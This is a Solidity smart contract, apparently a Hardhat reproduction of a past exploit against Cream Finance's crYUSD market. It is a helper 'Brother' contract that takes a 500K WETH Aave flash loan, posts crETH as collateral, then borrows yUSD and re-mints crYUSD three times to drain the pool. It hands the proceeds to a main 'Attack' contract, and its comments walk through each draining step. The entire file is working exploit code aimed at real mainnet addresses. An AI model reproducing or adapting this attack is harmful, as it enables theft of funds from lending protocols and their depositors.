
pragma solidity ^0.8;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./Attack.sol";
import "./interfaces/IWETH.sol";
import "./interfaces/aave/FlashLoanReceiverBase.sol";
import "./interfaces/IcrETH.sol";
import "./interfaces/IUnitroller.sol";
import "./interfaces/IcrYUSD.sol";


import "hardhat/console.sol";

contract Brother is Ownable, FlashLoanReceiverBase {

    address payable brother;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 WETH_AMOUNT = 524102159298234706604104; // 500K WETH

    address crETH = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address crYUSD = 0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4;
    address yUSD = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;

    // Unitroller
    address UnitrollerAddress = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;

    modifier onlyBrother {
        require(msg.sender == brother, "Not my brother");
        _;
    }

    constructor(address payable _brother, ILendingPoolAddressesProvider _addressProvider)
        FlashLoanReceiverBase(_addressProvider)
    {
        brother = _brother;
    }

    fallback () external payable {}

    function flashLoanAAVE() external onlyBrother {
        // Don't know why exploiter queried this?
        (uint err, uint liquidity, uint shortfall) = IUnitroller(UnitrollerAddress).getAccountLiquidity(brother);

        address receiver = address(this);

        address[] memory assets = new address[](1);
        assets[0] = WETH;

        uint[] memory amounts = new uint[](1);
        amounts[0] = WETH_AMOUNT;

        uint[] memory modes = new uint[](1);
        modes[0] = 0;

        address onBehalfOf = address(this);

        bytes memory params = "";
        uint16 referralCode = 0;

        LENDING_POOL.flashLoan(
            receiver,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );

        moveFunds();
    }

    function executeOperation(
        address[] calldata assets,
        uint[] calldata amounts,
        uint[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(initiator == address(this), "Untrusted loan initiator");

        continueAttack();


        // Approve for repay
        for (uint i = 0; i < assets.length; i++) {
            uint amountOwing = amounts[i] + premiums[i];
            IERC20(assets[i]).approve(address(LENDING_POOL), amountOwing);
        }

        return true;
    }

    function continueAttack() internal {
        uint sendAmount = 6000 * 1e18;
        uint remainAmount = WETH_AMOUNT - sendAmount;
        IWETH(WETH).transfer(brother, sendAmount);
        IWETH(WETH).withdraw(remainAmount);

        // mint crETH
        IcrETH(payable(crETH)).mint{value: remainAmount}();
        address[] memory cTokens = new address[](1);
        cTokens[0] = crETH;
        // use crETH as collateral
        IUnitroller(UnitrollerAddress).enterMarkets(cTokens);
        // borrow yUSD from Cream
        uint yUSDBalanceInCream = IERC20(yUSD).balanceOf(crYUSD);
        IcrYUSD(crYUSD).borrow(yUSDBalanceInCream);
        uint yUSDBalance = IERC20(yUSD).balanceOf(address(this));
        // mint crYUSD using yUSD
        IERC20(yUSD).approve(crYUSD, yUSDBalance);
        IcrYUSD(crYUSD).mint(yUSDBalance);
        uint crYUSDBalance = IERC20(crYUSD).balanceOf(address(this));
        // transfer crYUSD to main attack contract
        IERC20(crYUSD).transfer(brother, crYUSDBalance);
        // borrow yUSD from Cream again!
        // Remember that by minting crYUSD the yUSD got transferred
        // back to Cream so we can borrow it again
        IcrYUSD(crYUSD).borrow(yUSDBalanceInCream);
        yUSDBalance = IERC20(yUSD).balanceOf(address(this));
        // mint crYUSD using yUSD again!
        IERC20(yUSD).approve(crYUSD, yUSDBalance);
        IcrYUSD(crYUSD).mint(yUSDBalance);
        crYUSDBalance = IERC20(crYUSD).balanceOf(address(this));
        // transfer crYUSD to main attack contract again!
        IERC20(crYUSD).transfer(brother, crYUSDBalance);
        // borrow yUSD from Cream for the third time and transfer to main attack contract
        IcrYUSD(crYUSD).borrow(yUSDBalanceInCream);
        yUSDBalance = IERC20(yUSD).balanceOf(address(this));
        IERC20(yUSD).transfer(brother, yUSDBalance);

        // In total we transferred 1B crYUSD & 500M yUSD to main contract
        Attack(brother).continueAttack();
    }

    function moveFunds() internal {
        IERC20(WETH).transfer(owner(), IERC20(WETH).balanceOf(address(this)));
    }
}